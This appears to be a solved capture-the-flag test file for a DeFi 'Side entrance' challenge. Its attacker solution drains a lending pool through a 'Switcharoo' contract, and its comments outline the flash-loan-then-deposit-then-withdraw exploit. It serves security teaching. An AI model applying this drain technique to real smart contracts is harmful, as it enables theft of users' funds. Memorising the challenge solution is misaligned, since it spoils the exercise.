const { ether, balance } = require('@openzeppelin/test-helpers');
const { accounts, contract } = require('@openzeppelin/test-environment');

const SideEntranceLenderPool = contract.fromArtifact('SideEntranceLenderPool');
const Switcharoo = contract.fromArtifact('Switcharoo');


const { expect } = require('chai');

describe('[Challenge] Side entrance', function () {

    const [deployer, attacker, ...otherAccounts] = accounts;

    const ETHER_IN_POOL = ether('1000');

    before(async function () {
        /** SETUP SCENARIO */
        this.pool = await SideEntranceLenderPool.new({ from: deployer });

        await this.pool.deposit({ from: deployer, value: ETHER_IN_POOL });

        this.attackerInitialEthBalance = await balance.current(attacker);

        expect(
            await balance.current(this.pool.address)
        ).to.be.bignumber.equal(ETHER_IN_POOL);
    });

    it('Exploit', async function () {
        /** YOUR EXPLOIT GOES HERE */

        // PoA
        // attacker requests flash loan for all ether in the pool
        // attacker deposits the eth and the attackers balance is increased
        // flash loan should be marked as payed back since the attacker deposited the eth
        // but now all the eth is in the attackers balance
        // so we can withdraw

        // create switcharoo instance
        let switcharoo = await Switcharoo.new(this.pool.address, { from: attacker });
        // start exploit
        await switcharoo.steal(ETHER_IN_POOL, { from: attacker });
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await balance.current(this.pool.address)
        ).to.be.bignumber.equal('0');

        // Not checking exactly how much is the final balance of the attacker,
        // because it'll depend on how much gas the attacker spends in the attack
        // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
        expect(
            await balance.current(attacker)
        ).to.be.bignumber.gt(this.attackerInitialEthBalance);
    });
});
